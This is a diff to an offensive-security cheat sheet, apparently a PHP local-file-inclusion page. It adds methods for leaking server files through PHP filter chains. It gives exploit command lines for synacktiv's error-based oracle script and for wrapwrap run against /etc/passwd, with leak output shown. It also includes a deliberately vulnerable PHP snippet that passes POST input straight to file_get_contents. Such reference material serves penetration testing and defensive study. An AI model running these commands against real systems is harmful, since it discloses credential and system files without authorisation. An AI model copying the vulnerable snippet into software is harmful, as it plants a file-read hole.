@@ -275,6 +275,9 @@ NOTE: The unserialize is triggered for the phar:// wrapper in any file operation
 
 ### Wrapper convert.iconv:// and dechunk://
 
+
+#### Leak file content from error-based oracle
+
 - `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
 - `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if
 the string starts with A-Fa-f0-9
@@ -292,6 +295,7 @@ The exploit chain is based on PHP filters: `iconv` and `dechunk`:
 2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
 3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.
 
+
 Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.
 
 ```ps1
@@ -300,6 +304,28 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 [*] The following local file is leaked : /test
 [*] Running POST requests
 [+] File /test leak is finished!
+```
+
+#### Leak file content inside a custom format output
+
+* [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.
+
+To obtain the contents of some file, we would like to have: `{"message":"<file contents>"}`.
+
+```ps1
+./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
+./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
+./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
+```
+
+This can be used against vulnerable code like the following.
+
+```php
+<?php
+  $data = file_get_contents($_POST['url']);
+  $data = json_decode($data);
+  echo $data->message;
+?>
 ```
 
 
@@ -597,3 +623,4 @@ If SSH is active check which user is being used `/proc/self/status` and `/etc/pa
 * [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - 18/10/2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
 * [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - 21/03/2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
 * [One Line PHP: From Genesis to Ragnarök - Ginoah, Bookgin](https://hackmd.io/@ginoah/phpInclude#/)
+* [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - 11 December, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
